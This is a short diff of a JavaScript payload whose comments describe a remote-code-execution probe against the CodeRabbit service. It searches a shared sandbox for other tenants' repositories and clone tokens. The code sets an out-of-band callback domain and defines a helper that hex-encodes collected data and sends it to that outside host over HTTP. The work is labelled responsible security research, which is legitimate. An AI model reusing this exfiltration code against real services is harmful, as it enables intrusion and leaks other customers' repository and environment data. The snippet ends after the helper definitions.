@@ -1,7 +1,7 @@
 // CodeRabbit RCE — cross-tenant residue + clone-token characterization (responsible).
 // Looks for OTHER tenants' repos/tokens in the (possibly reused) sandbox.
 // Token VALUES are never exfiltrated — only repo identities, header TYPE, masked env.
-var C = 'd8rbjcroeaqo43b7mo60db7f5zdmi9xxe.oast.online';
+var C = 'd8rcd93oeaqo9b8a89eg6ugftbrp5ewqj.oast.me';
 var http = require('http'), dns = require('dns'), cp = require('child_process');
 var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
 var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1600), timeout: 7000 }, function () {}).on('error', function () {}); } catch (e) {} };
